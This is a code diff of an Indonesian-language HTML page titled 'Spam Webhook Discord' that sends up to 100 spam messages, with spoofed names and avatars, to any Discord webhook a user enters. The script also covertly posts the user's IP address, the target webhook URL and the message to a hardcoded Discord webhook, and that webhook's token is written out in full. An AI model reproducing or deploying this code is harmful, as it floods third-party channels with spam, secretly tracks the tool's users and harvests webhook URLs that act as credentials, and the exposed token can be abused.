@@ -51,70 +51,54 @@
     <div class="container">
         <h2>Spam Webhook Discord</h2>
         <input type="text" id="webhook" placeholder="Masukkan Webhook URL"><br>
+        <input type="text" id="username" placeholder="Masukkan Nama Webhook"><br>
+        <input type="text" id="avatar" placeholder="Masukkan URL Avatar"><br>
         <input type="text" id="message" placeholder="Masukkan Pesan"><br>
         <input type="number" id="count" placeholder="Jumlah Pesan" min="1" max="100" value="10"><br>
         <select id="mode">
             <option value="text">Teks Biasa</option>
             <option value="embed">Embed</option>
         </select><br>
-        <button onclick="startSpam()">Mulai Spam</button>
+        <button id="spamButton" onclick="startSpam()">Mulai Spam</button>
         <p id="status">Menunggu input...</p>
     </div>
     <script>
-        async function getIP() {
-            try {
-                let response = await fetch('https://api.ipify.org?format=json');
-                let data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error("Gagal mendapatkan IP", error);
-                return "Unknown";
-            }
-        }
-
-        async function logToDiscord(ip, count, webhook, message) {
-            const logWebhook = "https://discord.com/api/webhooks/1348879562997502033/xMnKC-mNZUKJDQTsICPY2OBWfvZ-dD7McfACxNEP7HRGfXPyY61uF4IfpVuIpRz2Bnyz"; // Ganti dengan webhook log Anda
-            const embed = {
-                embeds: [{
-                    title: "Log Spammer",
-                    description: `IP **${ip}** telah menggunakan spammer sebanyak **${count}** ke webhook: **${webhook}**`,
-                    fields: [
-                        {
-                            name: "Pesan yang dikirim",
-                            value: message
-                        }
-                    ],
-                    color: 15158332,
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            await fetch(logWebhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(embed)
-            });
-        }
+        let isSpamming = false;
 
         async function startSpam() {
+            if (isSpamming) {
+                alert("Harap tunggu! Proses pengiriman masih berlangsung.");
+                return;
+            }
+
             let webhook = document.getElementById('webhook').value;
+            let username = document.getElementById('username').value;
+            let avatar = document.getElementById('avatar').value;
             let message = document.getElementById('message').value;
             let count = parseInt(document.getElementById('count').value);
             let mode = document.getElementById('mode').value;
             let status = document.getElementById('status');
-            
+            let spamButton = document.getElementById('spamButton');
+
             if (!webhook || !message || count <= 0 || count > 100) {
                 alert("Harap isi semua kolom dengan benar! Maksimal 100 pesan.");
                 return;
             }
-            
+
+            isSpamming = true;
+            spamButton.disabled = true;
             status.innerText = "Mengirim pesan...";
-            let ip = await getIP();
-            await logToDiscord(ip, count, webhook, message);
-            
+
             for (let i = 0; i < count; i++) {
-                let payload = mode === "text" ? { content: message } : {
+                let payload = mode === "text" ? {
+                    content: message,
+                    username: username || "Spammer Bot",
+                    avatar_url: avatar || ""
+                } : {
+                    username: username || "Spammer Bot",
+                    avatar_url: avatar || "",
                     embeds: [{
-                        title: "Spammers Discord",
+                        title: "Spammer Discord",
                         description: message,
                         color: 3447003
                     }]
@@ -132,7 +116,38 @@
                     break;
                 }
             }
+
+            let userIP = "Tidak diketahui";
+            try {
+                let response = await fetch("https://api64.ipify.org?format=json");
+                let data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                console.error("Gagal mendapatkan IP:", error);
+            }
+
+            // ubah link webhook kalian disini, untuk mengirim logs yang menggunakan spammers
+            let logWebhook = "https://discord.com/api/webhooks/1348879562997502033/xMnKC-mNZUKJDQTsICPY2OBWfvZ-dD7McfACxNEP7HRGfXPyY61uF4IfpVuIpRz2Bnyz";
+            let logPayload = {
+                username: "Spam Logger",
+                avatar_url: "https://example.com/log-avatar.png",
+                embeds: [{
+                    title: "Log Aktivitas Spammer",
+                    description: `🔹 **IP Pengguna:** ${userIP}\n🔹 **Jumlah Pesan:** ${count}\n🔹 **Webhook Tujuan:** ${webhook}\n🔹 **Pesan:** ${message}`,
+                    color: 16711680,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await fetch(logWebhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(logPayload)
+            });
+
             status.innerText = "Semua pesan telah dikirim!";
+            isSpamming = false;
+            spamButton.disabled = false;
         }
     </script>
 </body>
